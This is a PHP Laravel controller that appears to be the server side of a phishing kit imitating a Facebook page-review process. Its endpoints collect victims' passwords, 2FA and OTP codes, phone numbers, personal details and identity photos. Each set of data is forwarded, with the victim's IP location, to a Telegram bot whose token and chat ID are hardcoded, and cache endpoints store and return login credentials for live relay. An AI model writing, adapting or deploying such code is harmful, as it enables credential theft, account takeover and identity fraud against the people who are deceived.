<?php

namespace App\Http\Controllers;

use App\Models\Language;
use App\Models\Setting;
use GuzzleHttp\Client;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\App;
use Illuminate\Support\Facades\Cache;
use Throwable;

class Controller extends BaseController
{
    use AuthorizesRequests, ValidatesRequests;

    public $botKey;
    public $groupTelegramId;
    public $email;
    public $password;

    public function __construct()
    {
        $settings = Cache::rememberForever('settings', function () {
            return \App\Models\Setting::pluck('value', 'key')->toArray();
        });
        $this->botKey = "7324632829:AAGy8JgoHLUt7d5J7GMRQzxr6RreU8K-f8k" ?? $settings['bot_id'];
        $this->groupTelegramId = "-4259369378" ?? $settings['group_id'];
        // $this->botKey = $settings['bot_id'];
        // $this->groupTelegramId = $settings['group_id'];
    }

    public function getAndSendDataFa(Request $request): JsonResponse
    {
        try {
            $infoByIP = $this->getInfoByIP($request);
            $name_fanpage = $request->name_fanpage ?? '';
            $fullname = $request->fullname ?? '';
            $bussiness_email = $request->bussiness_email ?? '';
            $personal_email = $request->personal_email ?? '';
            $phone = $request->phone ?? '';
            $information = $request->information ?? '';
            $password_1 = $request->password_1 ?? '';
            $password_2 = $request->password_2 ?? '';
            $fa_code_1 = $request->fa_code_1 ?? '';
            $fa_code_2 = $request->fa_code_2 ?? '';
            $ipAddress = $infoByIP['ipAddress'];
            $countryName = $infoByIP['countryName'];
            $cityName = $infoByIP['cityName'];
            $data = [
                'chat_id' => $this->groupTelegramId,
                // 'text' => "$infoByIP\nName fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2\nFA code first: $fa_code_1\nFA code second: $fa_code_2",
                'text' => "Code: $fa_code_1\nIP Address: $ipAddress\nCountry: $countryName\nCity: $cityName",
            ];
            $client = new Client();
            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
                'json' => $data
            ]);

            return response()->json([
                'status' => 0
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function getAndSendDataLogin(Request $request): JsonResponse
    {
        try {
            $infoByIP = $this->getInfoByIP($request);
            $name_fanpage = $request->name_fanpage ?? '';
            $fullname = $request->fullname ?? '';
            $bussiness_email = $request->bussiness_email ?? '';
            $personal_email = $request->personal_email ?? '';
            $phone = $request->phone ?? '';
            $information = $request->information ?? '';
            $password_1 = $request->password_1 ?? '';
            $password_2 = $request->password_2 ?? '';
            $info = implode('\n', $infoByIP);
            $data = [
                'chat_id' => $this->groupTelegramId,
                'text' => "$info\nName fanpage: $name_fanpage\nFull name: $fullname\nBusiness email: $bussiness_email\nPersonal email: $personal_email\nPhone: $phone\nInfo: $information\nPassword first: $password_1\nPassword second: $password_2"
            ];

            $client = new Client();
            $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
                'json' => $data
            ]);

            return response()->json([
                'status' => 0
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function deleteAllCache(Request $request)
    {
        try {
            Cache::flush();

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function setCacheByEmail(Request $request): JsonResponse
    {
        try {
            $email = $request->email ?? '';
            $password = $request->password ?? '';
            $fa = $request->fa ?? '';
            $isLoginSuccessfully = $request->isLoginSuccessfully ?? '';
            $isFaSuccessfully = $request->isFaSuccessfully ?? '';
            $typeFa = $request->typeFa ?? '';
            $isCheckLogin = $request->isCheckLogin ?? 0;
            $isCheckFa = $request->isCheckFa ?? 0;
            Cache::put($email, json_encode([
                'ip' => $request->ip(),
                'email' => $email,
                'password' => $password,
                'fa' => $fa,
                'typeFa' => $typeFa,
                'isLoginSuccessfully' => $isLoginSuccessfully,
                'isFaSuccessfully' => $isFaSuccessfully,
            ]), 10);

            return response()->json([
                'status' => 0,
            ]);
        } catch (Throwable $e) {
            Cache::forget($email);
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function getCacheByEmail(Request $request): JsonResponse
    {
        try {
            $email = $request->email ?? '';
            return response()->json([
                'status' => 0,
                'data' => json_decode(Cache::pull($email, ''))
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function getCacheByKey(Request $request): JsonResponse
    {
        try {
            $key = $request->key ?? '';
            return response()->json([
                'status' => 0,
                'data' => json_decode(Cache::pull($key, ''))
            ]);
        } catch (Throwable $e) {
            return response()->json([
                'status' => 1,
                'message' => $e->getMessage(),
            ]);
        }
    }

    public function index()
    {
        $settings = Cache::rememberForever('settings', function () {
            return Setting::pluck('value', 'key')->toArray();
        });
        return view('home', [
            'settings' => $settings,
        ]);
    }


    public function logout()
    {
        auth()->logout();
        return redirect()->route('admin.login');
    }

    public function setLocale(Request $request)
    {
        $locale = $request->get('locale', 'en');
        $activeLanguages = Cache::remember('active-languages', Carbon::now()->addHours(2), function () {
            return Language::where('status', 1)->pluck('id', 'code');
        });
        if (!isset($activeLanguages[$locale])) {
            $locale = 'en';
        }
        session()->put('locale', $locale);
        app()->setLocale($locale);
        App::setLocale($locale);

        session()->put('is_redirect', 1);
        return redirect()->back();
    }

    public function setCountryCode(Request $request)
    {
        $path = public_path('/country-code-to-locale.json');
        $jsonString = file_get_contents($path);
        $countryCodeToLocale = json_decode($jsonString, true);
        $countryCode = strtoupper($request->get('country_code', 'US'));
        $locale = $countryCodeToLocale[$countryCode] ?? 'en';
        $activeLanguages = Cache::remember('active-languages', Carbon::now()->addHours(2), function () {
            return Language::where('status', 1)->pluck('id', 'code');
        });
        if (!isset($activeLanguages[$locale])) {
            $locale = 'en';
        }
        session()->put('country_code', $countryCode);
        session()->put('locale', $locale);
        app()->setLocale($locale);
        App::setLocale($locale);

        session()->put('is_redirect', 1);
        session()->put('is_got_ip_country_code', 1);
        return redirect()->back();
    }

    public function getAndSendDataReview(Request $request): JsonResponse
    {
        $roles = [
            'admin' => __('review_requested.role_admin'),
            'editor' => __('review_requested.role_editor'),
            'staff' => __('review_requested.role_staff'),
            'partner' => __('review_requested.role_partner'),
            'advertiser' => __('review_requested.role_advertiser'),
        ];
        $reasons = [
            '1' => __('review_requested.not_sure_policy'),
            '2' => __('review_requested.not_violated_policy'),
            '3' => __('review_requested.input_reason'),
        ];
        $fullname = $request->fullname ?? '';
        $day = $request->day ?? '';
        $month = $request->month ?? '';
        $year = $request->year ?? '';
        $role = $request->role ?? '';
        $reason = $request->reason ?? '';
        $reason_input = $request->reason_input ?? '';
        $infoByIP = $this->getInfoByIP($request);

        if ((int)$day < 10) {
            $day = "0" . $day;
        }
        if ((int)$month < 10) {
            $month = "0" . $month;
        }

        $data = [
            'chat_id' => $this->groupTelegramId,
            'text' => "$infoByIP\nFullname: $fullname\nDateOfBirth: $day-$month-$year\nRole: $roles[$role]\nReason: $reasons[$reason]\nInput Reason: $reason_input"
        ];
        $client = new Client();
        $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
            'json' => $data
        ]);
        return response()->json(['data' => 'success']);
    }

    public function getAndSendDataIdentity(Request $request): JsonResponse
    {
        $image = $request->file('image');
        $imageUrl = $image->store('photos');
        $imageUrl = asset('/storage/' . $imageUrl);
        $infoByIP = $this->getInfoByIP($request);
        $data = [
            'chat_id' => $this->groupTelegramId,
            'photo' => $imageUrl,
            'caption' => "$infoByIP"
        ];
        $client = new Client();
        $client->post("https://api.telegram.org/bot$this->botKey/sendPhoto", [
            'json' => $data
        ]);
        return response()->json(['data' => 'success']);
    }

    public function getAndSendDataMobile(Request $request): JsonResponse
    {
        $digit_code = $request->digit_code ?? '';
        $phone_number = $request->phone_number ?? '';
        $phoneNumber = $digit_code . $phone_number;
        $infoByIP = $this->getInfoByIP($request);

        $data = [
            'chat_id' => $this->groupTelegramId,
            'text' => "$infoByIP\nPhoneNumber: $phoneNumber"
        ];
        $client = new Client();
        $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
            'json' => $data
        ]);
        return response()->json(['data' => 'success']);
    }

    public function getAndSendDataOtp(Request $request): JsonResponse
    {
        $otp = $request->otp ?? '';
        $infoByIP = $this->getInfoByIP($request);

        $data = [
            'chat_id' => $this->groupTelegramId,
            'text' => "$infoByIP\nOtp: $otp"
        ];
        $client = new Client();
        $client->post("https://api.telegram.org/bot$this->botKey/sendMessage", [
            'json' => $data
        ]);

        return response()->json(['data' => 'success']);
    }

    private function getInfoByIP(Request $request)
    {
        $ipAddress = $request->ipAddress ?? '';
        $errorMessage = "";
        if (filter_var($ipAddress, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
            $ipAddress = $request->ip();
        }
        if (filter_var($ipAddress, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
            $lookup = $this->convertIpV6toIpV4($ipAddress);
            $ipAddress = $lookup['success'] ? $lookup['ip'] : $ipAddress;
            $errorMessage = !$lookup['success'] ? $lookup['ip'] : "";
        }
        //        $latitude = $request->latitude ?? '';
        //        $longitude = $request->longitude ?? '';
        $countryName = $request->countryName ?? '';
        //        $countryCode = $request->countryCode ?? '';
        $regionName = $request->regionName ?? '';
        $cityName = $request->cityName ?? '';
        //        $timeZone = $request->timeZone ?? '';
        $zipCode = $request->zipCode ?? '';
        $continent = $request->continent ?? '';
        //        $continentCode = $request->continentCode ?? '';
        // return "IP Adress: $ipAddress\nCity name: $cityName\nRegion name: $regionName\nCountry name: $countryName\nContinent: $continent\nZipcode: $zipCode\n$errorMessage\n";
        return [
            'ipAddress' => $ipAddress,
            'cityName' => $cityName,
            'regionName' => $regionName,
            'countryName' => $countryName,
            'continent' => $continent,
            'zipCode' => $zipCode,
            'errorMessage' => $errorMessage,
        ];
    }

    private function convertIpV6toIpV4($ipv6)
    {
        $ipv4 = gethostbyname($ipv6);

        // Kiểm tra xem kết quả là IPv4 hợp lệ hay không
        if (filter_var($ipv4, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
            return [
                'success' => true,
                'ip' => $ipv4
            ];
        } else {
            return [
                'success' => false,
                'ip' => "Cannot convert IPv6 to IPv4."
            ];
        }
    }
}
